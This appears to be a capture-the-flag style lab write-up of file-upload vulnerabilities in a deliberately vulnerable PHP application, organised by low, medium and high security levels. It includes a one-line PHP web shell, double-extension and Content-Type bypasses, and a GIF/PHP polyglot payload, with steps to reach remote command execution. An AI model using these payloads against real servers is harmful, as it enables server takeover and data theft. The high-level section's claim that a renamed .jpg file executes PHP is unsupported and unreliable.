# File Upload

**Security Levels:** Low | Medium | High

---

## LOW Level

### Why it is Vulnerable

* No file type validation
* No file extension restriction
* No MIME type verification
* Upload directory is web‑accessible
* Executable files allowed

---

### Vulnerable Code

```php
move_uploaded_file($_FILES['uploaded']['tmp_name'],
"hackable/uploads/" . $_FILES['uploaded']['name']);
```

---

### Payloads (PoC)

#### PHP Web Shell

```php
<?php system($_GET['cmd']); ?>
```

---

#### File Name

```
shell.php
```

---

### Exploitation Steps

* Upload malicious PHP file
* Access uploaded file via browser
* Execute system commands

---

### Result

* Web shell uploaded successfully
* Remote command execution achieved

---

### Impact

* Remote Code Execution (RCE)
* Complete server compromise
* Data theft and defacement

---

### Severity: **High**

---

## MEDIUM Level

### Why it is Vulnerable

* File extension blacklist applied
* MIME type checked via client request
* No server‑side content inspection
* Bypass possible using double extensions

---

### Code Behavior

```php
if( in_array($ext, array("jpg","png","gif")) ) {
    move_uploaded_file(...);
}
```

---

### Payloads (PoC)

#### Double Extension Bypass

```
shell.php.jpg
```

---

#### Content‑Type Bypass

```http
Content-Type: image/jpeg
```

---

### Exploitation Steps

* Rename shell with double extension
* Intercept request using Burp Suite
* Change Content‑Type header
* Upload file successfully

---

### Result

* File upload restriction bypassed
* Shell accessible on server

---

### Impact

* RCE still possible
* Weak validation logic exposed

---

### Severity: **Medium**

---

## HIGH Level

### Why it is Vulnerable

* Server‑side validation implemented
* File renamed after upload
* Upload path restricted
* Logic flaw allows PHP execution

---

### Vulnerable Logic

```php
$target_path = "hackable/uploads/" . md5($_FILES['uploaded']['name']) . ".jpg";
move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path);
```

---

### Attack Concept

> Execute PHP code inside image file using **polyglot payload**.

---

### Payloads (PoC)

#### Image + PHP Polyglot

```php
GIF89a
<?php system($_GET['cmd']); ?>
```

---

### File Name

```
image.jpg
```

---

### Exploitation Steps

* Embed PHP code inside valid image
* Upload image file
* Access file via browser
* Execute command parameter

---

### Result

* Server executes embedded PHP
* RCE achieved despite protections

---

### Impact

* Full application compromise
* Defense bypass using logic flaw

---

### Severity: **High**

---

## Overall Impact Summary

* File upload flaws lead to RCE
* Blacklist and MIME checks are weak
* Polyglot files bypass validations
* High risk vulnerability

---